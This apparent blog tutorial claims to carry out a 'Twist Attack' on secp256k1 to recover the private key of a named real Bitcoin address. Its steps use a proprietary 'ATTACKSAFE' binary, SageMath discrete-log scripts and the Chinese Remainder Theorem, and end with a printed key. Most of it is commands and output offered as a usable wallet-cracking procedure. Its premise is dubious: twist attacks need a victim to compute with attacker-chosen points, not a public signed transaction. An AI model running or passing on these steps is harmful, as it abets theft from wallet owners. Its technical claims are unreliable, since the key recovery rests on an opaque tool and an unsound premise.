
# Twist Attack

---


---





		
<figure class="wp-block-image size-large"><img decoding="async" width="1024" height="576" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/031-1024x576.png" alt="Twist Attack example №1 perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet" class="wp-image-1861" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/01/031-1024x576.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/01/031-300x169.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/01/031-768x432.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/01/031.png 1280w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>

---


* Tutorial: https://youtu.be/S_ZUcM2cD8I
* Tutorial: https://cryptodeeptech.ru/twist-attack


---

<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Not so long ago, the&nbsp;<a href="https://security.snyk.io/package/npm/elliptic/6.5.4" target="_blank" rel="noreferrer noopener">elliptic (6.5.4)</a>&nbsp;package for standard elliptic curves was&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/" target="_blank" rel="noreferrer noopener">vulnerable to various attacks</a>&nbsp;, one of which is the&nbsp;<a href="https://cryptodeeptech.ru//twist-attack/" target="_blank" rel="noreferrer noopener">Twist Attack</a>&nbsp;.&nbsp;The cryptographic problem was in the implementation of secp256k1.&nbsp;We know that the Bitcoin cryptocurrency uses&nbsp;<a href="https://cryptodeep.ru/endomorphism/" target="_blank" rel="noreferrer noopener">secp256k1</a>&nbsp;and this attack did not bypass Bitcoin, according to the&nbsp;<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28498" target="_blank" rel="noreferrer noopener">CVE-2020-28498</a>&nbsp;vulnerability, the confirming parties of the ECDSA algorithm transaction through certain points on the secp256k1 elliptic curve transmitted partial private key values ​​(simpler subgroups consisting of 5 to 45 bit )<br>called sextic&nbsp;<a href="https://crypto.stackexchange.com/questions/68951/computing-a-sextic-twist" target="_blank" rel="noreferrer noopener">twists</a>this process is so dangerous that it reveals encrypted data after performing a series of ECC operations.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2071"></figure></div>


<p>In this article, we will implement a Twist Attack with an example and show how, using certain points on the secp256k1 elliptic curve, we can get partial private key values ​​and restore a Bitcoin Wallet within 5-15 minutes using&nbsp;<a href="https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm_for_logarithms" target="_blank" rel="noreferrer noopener">“Sagemath pollard rho function: (discrete_log_rho)”</a>&nbsp;and&nbsp;<a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem" target="_blank" rel="noreferrer noopener">“ Chinese Remainder Theorem”</a>&nbsp;.</p>



<blockquote class="wp-block-quote">
<p>In other words, these certain points are maliciously chosen points on the secp256k1 elliptic curve</p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-1-1024x513.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2078"><figcaption class="wp-element-caption"><a href="https://github.com/christianlundkvist/blog/blob/master/2020_05_26_secp256k1_twist_attacks/secp256k1_twist_attacks.md" target="_blank" rel="noreferrer noopener">https://github.com/christianlundkvist/blog/blob/master/2020_05_26_secp256k1_twist_attacks/secp256k1_twist_attacks.md</a></figcaption></figure></div>


<p>According to Paulo Barreto tweet:&nbsp;<a href="https://twitter.com/pbarreto/status/825703772382908416?s=21" target="_blank" rel="noreferrer noopener">https://twitter.com/pbarreto/status/825703772382908416?s=21</a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-2-1024x706.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2079"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>The cofactor is 3^2*13^2*3319*22639</h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-3-1024x710.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2082"></figure></div>


<pre class="wp-block-code"><code>E1: 20412485227
E2: 3319, 22639
E3: 109903, 12977017, 383229727
E4: 18979
E6: 10903, 5290657, 10833080827, 22921299619447

prod = 20412485227 * 3319 * 22639 *109903 * 12977017 * 383229727 * 18979 * 10903 * 5290657 * 10833080827 * 22921299619447

38597363079105398474523661669562635951234135017402074565436668291433169282997 = 3 * 13^2 * 3319 * 22639 * 1013176677300131846900870239606035638738100997248092069256697437031

HEX:0x55555555555555555555555555555555C1C5B65DC59275416AB9E07B0FEDE7B5

</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p>When running a&nbsp;<a href="https://cryptodeeptech.ru/twist-attack/">Twist Attack</a>&nbsp;, the “private key” can be obtained by a certain choice of the “public key” (selected point of the secp256k1 elliptic curve), that is, the value in the transaction is revealed.After that, information about the private key will also be revealed, but for this you need to perform several ECC operations.</p>
</blockquote>



<pre class="wp-block-code"><code>E1: y^2 = x^3 + 1
E2: y^2 = x^3 + 2
E3: y^2 = x^3 + 3
E4: y^2 = x^3 + 4
E6: y^2 = x^3 + 6</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-4-1.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2086"></a><figcaption class="wp-element-caption"><code><a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener">https://attacksafe.ru/twist-attack-on-bitcoin</a></code></figcaption></figure></div>


<pre class="wp-block-code"><code>y² = x³ + ax + b. In the Koblitz curve,
y² = x³ + 0x + 7. In the Koblitz curve,
0  = x³ + 0  + 7
b '= -x ^ 3 - ax.</code></pre>



<blockquote class="wp-block-quote">
<p>All points&nbsp;<code>(x, 0)&nbsp;</code>fall on invalid curves with&nbsp;<code>b '= -x ^ 3 - ax</code></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s move on to the experimental part:</h2>



<p><em><code>(Consider a Bitcoin Address)</code></em></p>



<blockquote class="wp-block-quote">
<p><a href="https://btc1.trezor.io/address/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq" target="_blank" rel="noreferrer noopener"><strong>1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq</strong></a></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><em><code>(Now consider critical vulnerable transactions)</code></em></p>



<blockquote class="wp-block-quote">
<p><a href="https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731">https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-5-1024x216.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2101"></a></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Open&nbsp;&nbsp;<strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]</a></strong>&nbsp;.</p>



<p>Implementing the&nbsp;<a href="https://attacksafe.ru/twist-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>Twist Attack</strong></a>&nbsp;algorithm using our&nbsp;<a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener"><strong>18TwistAttack repository</strong></a></p>



<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/18TwistAttack/

ls</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-6-1024x477.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2108"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Install all the packages we need</h2>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-11.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-687"></figure>



<p><strong><code>requirements.txt</code></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>sudo apt install python2-minimal

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-7-1024x445.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2113"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-8-1024x440.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2115"></figure>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-9-1024x340.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2116"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-10-1024x452.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2117"><figcaption class="wp-element-caption">,</figcaption></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-11-1024x453.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2118"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><a href="https://btc1.trezor.io/address/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq" target="_blank" rel="noreferrer noopener"><strong>1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq</strong></a></p>



<p><a href="https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731">https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731</a></p>
</blockquote>



<figure class="wp-block-image"><a href="https://btc1.trezor.io/tx/d76a7daa4c5f67a2b553df96834845e4bf469a9806b3de1d89e107301230e731" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-12-1024x268.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2123"></a></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>RawTX = 0100000001ea20b8f18674f029b84a96fad22647eec129e0e5520c73a25c24a42ad3479c78100000006a47304402207eed07b5b09237851306a44a2b0f6bc2db0e2eaca45296a84ace41f8d2f5ccdb02205e4eebbaffdd48f2294c062ac1d34204d7bcb01d76ead96720cc9c6c570f8a0801210277144138c5d2e090d6cf65c8fc984cce82c39d2923c4e106a27e3e6bb92de4abffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<h2>Save in file: RawTX.txt</h2>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-13-1024x251.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2127"><figcaption class="wp-element-caption">RawTX.txt</figcaption></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>To implement the attack, we will use the&nbsp;</strong>&nbsp;<strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">“ATTACKSAFE SOFTWARE” software</a></strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-14.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-705"></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure></div>


<h2>Access rights:</h2>



<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-14(1).png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2134"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Application:</h2>



<pre class="wp-block-code"><code>./attacksafe -help</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-15.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2136"></figure>



<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -version</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-17.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2144"><figcaption class="wp-element-caption"><code>Version 5.3.2. [ATTACKSAFE SOFTWARE, © 2023]</code></figcaption></figure></div>


<p><code>"ATTACKSAFE SOFTWARE"</code>&nbsp;includes all popular attacks on Bitcoin.</p>



<h2>Let’s run a list of all attacks:</h2>



<pre class="wp-block-code"><code>./attacksafe -list</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-18.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2147"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-19.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2149"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-20.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2151"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-21.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2154"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s choose<code>&nbsp;-tool: twist_attack</code></p>



<p>To get specific secp256k1 points from the vulnerable ECDSA signature transaction, we added the data&nbsp;&nbsp;<code>RawTX</code>&nbsp;to a text document and saved it as a file&nbsp;<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001ea20b8f18674f029b84a96fad22647eec129e0e5520c73a25c24a42ad3479c78100000006a47304402207eed07b5b09237851306a44a2b0f6bc2db0e2eaca45296a84ace41f8d2f5ccdb02205e4eebbaffdd48f2294c062ac1d34204d7bcb01d76ead96720cc9c6c570f8a0801210277144138c5d2e090d6cf65c8fc984cce82c39d2923c4e106a27e3e6bb92de4abffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;&nbsp;<code>-tool twist_attack</code>&nbsp;using software&nbsp;<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool twist_attack -open RawTX.txt -save SecretPoints.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-24-1024x337.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2167"></figure>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-25-1024x282.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2169"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>We launched this attack from&nbsp;&nbsp;<code>-tool twist_attack</code>&nbsp;and the result was saved to a file&nbsp;<code>SecretPoints.txt</code></p>



<p>Now to see the successful result, open the file&nbsp;<code>SecretPoints.txt</code></p>



<pre class="wp-block-code"><code>cat SecretPoints.txt</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Result:</h2>



<pre class="wp-block-code"><code>Elliptic Curve Secret Points:

Q11 = E1([34618671789393965854613640290360235391647615481000045539933705415932995630501, 99667531170720247708472095466452031806107030061686920872303526306525502090483])
Q21 = E2([68702062392910446859944685018576437177285905222869560568664822150761686878291, 78930926874118321017229422673239275133078679240453338682049329315217408793256])
Q22 = E2([36187226669165513276610993963284034580749604088670076857796544959800936658648, 78047996896912977465701149036258546447875229540566494608083363212907320694556])
Q31 = E3([14202326166782503089885498550308551381051624037047010679115490407616052746319, 30141335236272151189582083030021707964727207106390862186771517460219968539461])
Q32 = E3([92652014076758100644785068345546545590717837495536733539625902385181839840915, 110864801034380605661536039273640968489603707115084229873394641092410549997600])
Q33 = E3([13733962489803830542904605575055556603039713775204829607439941608751927073977, 70664870695578622971339822919870548708506276012055865037147804103600164648175])
Q41 = E4([46717592694718488699519343483827728052018707080103013431011626167943885955457, 6469304805650436779501027074909634426373884406581114581098958955015476304831])
Q61 = E6([47561520942485905499349109889401345889145902913672896164353162929760278620178, 23509073020931558264499314846549082835888014703370452565866789873039982616042])
Q62 = E6([54160295444050675202099928029758489687871616334443609215013972520342661686310, 61948858375012652103923933825519305763658240249902247802977736768072021476029])
Q63 = E6([80766121303237997819855855617475110324697780810565482439175845706674419107782, 43455623036669369134087288965186672649514660807369135243341314597351364060230])
Q64 = E6([27687597533944257266141093122549631098147853637408570994849207294960615279263, 8473112666362672787600475720236754473089370067288223871796416412432107486062])


RawTX = 0100000001ea20b8f18674f029b84a96fad22647eec129e0e5520c73a25c24a42ad3479c78100000006a47304402207eed07b5b09237851306a44a2b0f6bc2db0e2eaca45296a84ace41f8d2f5ccdb02205e4eebbaffdd48f2294c062ac1d34204d7bcb01d76ead96720cc9c6c570f8a0801210277144138c5d2e090d6cf65c8fc984cce82c39d2923c4e106a27e3e6bb92de4abffffffff013a020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now let’s add the received secp256k1 points</h2>



<p>To do this, open&nbsp;<code><em>Python</em>-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py#L51" target="_blank" rel="noreferrer noopener"><strong>discrete.py</strong></a></p>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-26-1024x393.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2179"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To run&nbsp;<code><em>Python</em>-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py#L51" target="_blank" rel="noreferrer noopener"><strong>discrete.py</strong></a>&nbsp;install&nbsp;<strong><a href="https://www.sagemath.org/" target="_blank" rel="noreferrer noopener">SageMath</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-27.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2188"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-28-1024x445.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2189"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Installation command:</h2>



<pre class="wp-block-code"><code>sudo apt-get update
sudo apt-get install -y python3-gmpy2
yes '' | sudo env DEBIAN_FRONTEND=noninteractive apt-get -y -o DPkg::options::="--force-confdef" -o DPkg::options::="--force-confold" install sagemath</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-31-1024x422.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2201"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-32-1024x406.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2202"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-33-1024x401.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2204"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Check the installation of&nbsp;<strong><a href="https://www.sagemath.org/" target="_blank" rel="noreferrer noopener">SageMath</a></strong>&nbsp;by command:&nbsp;<a href="https://cryptodeep.ru/twist-attack/" target="_blank" rel="noreferrer noopener">sage -v</a></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-34.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2208"><figcaption class="wp-element-caption"><code>SageMath&nbsp;version&nbsp;9.0</code></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To solve the discrete logarithm&nbsp;<em><code>(Pollard's rho algorithm for logarithms)</code></em>run&nbsp;<code>Python-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py" target="_blank" rel="noreferrer noopener">discrete.py</a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-35-1024x520.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2210"></figure></div>


<h2>Run command:</h2>



<pre class="wp-block-code"><code>sage -python3 discrete.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-36.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2214"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Result:</h2>



<pre class="wp-block-code"><code>Discrete_log_rho:
5663673254
229
19231
43549
11713353
47161820
13016
6068
1461826
5248038982
9034433903442

PRIVATE KEY:
4843137891892877119728403798088723017104154997204069979961743654961499092503</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>privkey = crt([x11, x21, x22, x31, x32, x33, x41, x61, x62, x63, x64], [ord11, ord21, ord22, ord31, ord32, ord33, ord41, ord61, ord62, ord63, ord64])
</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p>We solved the discrete logarithm and using the “&nbsp;<em>Chinese Remainder Theorem</em>&nbsp;<code>(Chinese remainder theorem)</code>&nbsp;” got the private key in decimal format.</p>
</blockquote>



<h2>Convert private key to HEX format</h2>



<p><em>The decimal format of the private key has been saved to a file:</em>&nbsp;<code>privkey.txt</code></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-37.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2227"></figure></div>


<h2>Run Python-script:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/18TwistAttack/privkey2hex.py" target="_blank" rel="noreferrer noopener">privkey2hex.py</a></h2>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-38.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2230"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>python3 privkey2hex.py
cat privkey2hex.txt</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-39.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2231"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><em>Let’s open the resulting file:</em>&nbsp;<code>privkey2hex.txt</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Twist Attack example perform a series of ECC operations to get the value of Private Key to the Bitcoin Wallet - CRYPTO DEEP TECH_files/image-40.png" alt="Twist Attack example #1 perform a series of ECC operations to get the value of the private key to the Bitcoin Wallet" class="wp-image-2235"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Private key in HEX format:</p>



<p><code>PrivKey = 0ab51e7092866dadf86165ea0d70beb69086237a0e7f5a123d496d3d98e03617</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;&nbsp;&nbsp;check:</p>



